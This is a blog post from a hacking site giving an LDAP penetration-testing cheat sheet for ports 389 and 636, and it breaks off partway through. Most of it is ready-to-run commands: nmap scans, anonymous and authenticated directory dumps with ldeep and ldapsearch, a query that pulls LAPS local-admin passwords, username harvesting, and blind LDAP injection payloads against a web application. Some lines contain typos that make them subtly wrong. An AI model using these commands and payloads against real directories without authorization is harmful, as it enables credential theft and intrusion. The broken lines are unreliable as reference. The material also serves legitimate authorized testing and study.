---
title: Ldap Penetration Testing Cheatsheet - Port 389,636
url: https://www.hackingdream.net/2025/02/ldap-penetration-testing-cheatsheet-port-389-port-636.html
source: Hacking Dream
date: 2025-02-09
fetch_date: 2025-10-06T20:35:57.450778
---

# Ldap Penetration Testing Cheatsheet - Port 389,636

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### Ldap Penetration Testing Cheatsheet - Port 389,636

[February 08, 2025](https://www.hackingdream.net/2025/02/ldap-penetration-testing-cheatsheet-port-389-port-636.html "permanent link")

[![Ldap Penetration Testing Cheatsheet - Port 389,636](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8TJRd9iXJj6lzc83PSe5TRugGLd3GXQXGHJ0-ndZiv6UwEfEy40tLjKFNLAWtuGWuFy0Z4H6TT7B_dRW6XW9J-Pk4vnWffarhmcrGBcs4BzHjYrPCjTmldA7gA52OGPCjkB7OmgUvU8qzqxoylyBrs5Ioi-T4beQfCDBB0vrKVvLH7dIBpU8Ez1wWPuY/w640-h366/ldap--penetration-test-cheatsheet.jpg "Ldap Penetration Testing Cheatsheet - Port 389,636")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8TJRd9iXJj6lzc83PSe5TRugGLd3GXQXGHJ0-ndZiv6UwEfEy40tLjKFNLAWtuGWuFy0Z4H6TT7B_dRW6XW9J-Pk4vnWffarhmcrGBcs4BzHjYrPCjTmldA7gA52OGPCjkB7OmgUvU8qzqxoylyBrs5Ioi-T4beQfCDBB0vrKVvLH7dIBpU8Ez1wWPuY/s1024/ldap--penetration-test-cheatsheet.jpg)

```
LDAP - Port 389 or LDAP SSL on Port 636
```

```
Nmap Scan
map -n -sV --script "ldap* and not brute" -p389,636,3268,3269 10.10.10.10
nmap -sC -Pn -p389,636,3268,3269 10.10.10.10
```

```
#DUMP Everything from LDAP - Anonymous
ldeep ldap -a -d STEINS.local -s ldap://10.10.10.10 all dump

#Dump as an Authenticated User
ldeep ldap -u Administrator -p 'password' -d steins.local -s ldap://10.0.0.1 all dump
```

```
Basic LDAP Search Commands

#Get FULL Domain Name and it's contexts
ldapsearch -x -h 10.10.10.10 -s base namingcontexts
ldapsearch -H ldap://10.10.10.10 -x -s base namingcontexts

#Dump accessible data from ldap
ldapsearch -x -h forest.htb.local -s sub -b 'DC=HTB,DC=LOCAL' | tee ldap_dump.txt

#Dumping passwords using LDAP:
ldapsearch -x -h forest.htb.local -b 'DC=HTB,DC=LOCAL' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

ldapsearch -x -h 10.10.10.254 -D <<username>> -w <<password>> -b "dc=AJLAB,dc=COM" "(ms-MCS-AdmPwd=*)" ms-MSC-AdmPwd
```

```
Find the Basic Info - Domain name, usernames

#Find some info or creds
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -b '' -s base '(objectclass=*)'

#Collect usernames
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w "Pasword" -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | cut -d " " -f 2 > usernames.txt
```

```
Dumping Everything

#Try running ldapsearch without -D to see if anonymous access is allowed.
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -b "DC=domain,DC=fqdn,DC=com" "(objectClass=*)"

#List All Active Directory Objects (Everything)
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -D "CN=YourUser,CN=Users,DC=domain,DC=fqdn,DC=com" -w "YourPassword" -b "DC=domain,DC=fqdn,DC=com" "(objectClass=*)" dn objectClass

#Dump Everything
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -D "CN=YourUser,CN=Users,DC=domain,DC=fqdn,DC=com" -w "YourPassword" -b "DC=domain,DC=fqdn,DC=com" "(objectClass=*)" *

#Dump Everything If Anonymous Bind is Allowed
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -b "DC=domain,DC=fqdn,DC=com" "(objectClass=*)" *

#Dump Everything and Save the Output to a File
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -D "CN=YourUser,CN=Users,DC=domain,DC=fqdn,DC=com" -w "YourPassword" -b "DC=domain,DC=fqdn,DC=com" "(objectClass=*)" * > ldap_dump.txt
```

```
#List Specific Attributes
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -D "CN=YourUser,CN=Users,DC=domain,DC=fqdn,DC=com" -w "YourPassword" -b "DC=domain,DC=fqdn,DC=com" "(objectClass=*)" dn objectClass cn

#To exclude attributes and get only Distinguished Names (DNs):
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -D "CN=YourUser,CN=Users,DC=domain,DC=fqdn,DC=com" -w "YourPassword" -b "DC=domain,DC=fqdn,DC=com" "(objectClass=*)" dn

#List all users; -D can be email or Distinguished Name
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -D "CN=YourUser,CN=Users,DC=domain,DC=fqdn,DC=com" -w "YourPassword" -b "DC=domain,DC=fqdn,DC=com" "(objectClass=user)" dn cn sAMAccountName

#List all groups
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -D "CN=YourUser,CN=Users,DC=domain,DC=fqdn,DC=com" -w "YourPassword" -b "DC=domain,DC=fqdn,DC=com" "(objectClass=group)" dn cn sAMAccountName

#List Computers
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -D "CN=YourUser,CN=Users,DC=domain,DC=fqdn,DC=com" -w "YourPassword" -b "DC=domain,DC=fqdn,DC=com" "(objectClass=computer)" dn cn sAMAccountName

#List All Organizational Units (OUs)
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -D "CN=YourUser,CN=Users,DC=domain,DC=fqdn,DC=com" -w "YourPassword" -b "DC=domain,DC=fqdn,DC=com" "(objectClass=organizationalUnit)" dn ou

#List All Contacts (Non-user AD entries)
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -D "CN=YourUser,CN=Users,DC=domain,DC=fqdn,DC=com" -w "YourPassword" -b "DC=domain,DC=fqdn,DC=com" "(objectClass=contact)" dn cn mail

#List Group Memberships for a Specific User
ldapsearch -LLL -x -H ldap://DOMAIN.FQDN.COM -D "CN=YourUser,CN=Users,DC=domain,DC=fqdn,DC=com" -w "YourPassword" -b "DC=domain,DC=fqdn,DC=com" "(&(objectClass=user)(sAMAccountName=USERNAME))" memberOf
```

```
JXplorer can be used to acess ldap service

In the url or the response body, see if you can find "objectClass" - then its most probably using ldap
```

```
BLIND LDAP Injection - Web Application

# Web App allows us to list all available printers from LDAP without any errors, below search filter is used
(&(objectclass=printer)(type=Canon*))

if we inject ,,*)(objectless=*))(&(objectClass=void", then the web application will issue the following query:
(&(objectclass=*)(objectClass=*))(&(objectClass=void)(type=Canon*))

in that case, only tyhe LDAP query will be processed resulting in (&(objectClass=*)(ObjectClass=*)) being extracted from blank field.

 As a result, the printer icon will be shown to the client. As this query always returns results due to objectClass being set to a wildcard. We can construct further true/false statements in the following way :
(&(objectClass=*)(object Class=users))(&object Class=foo)(type=Canon*))(&(objectClass=*)(objectClass=resources))(&object Class=foo)(type=Canon*))

Using such queries, it is possible to enumerate possible object classes based on true/false conditio (printer icon should be shown or not).

Similar logic can be used in case of "OR" blind LDAP injection. Consider the following query with injected part:

#query returns no object, so the printer icon should not be shown to the user.
(|(objectClass=void)(objectClass=void))(&objectClass=void)(type=Canon*))

#Enumerate Directory St...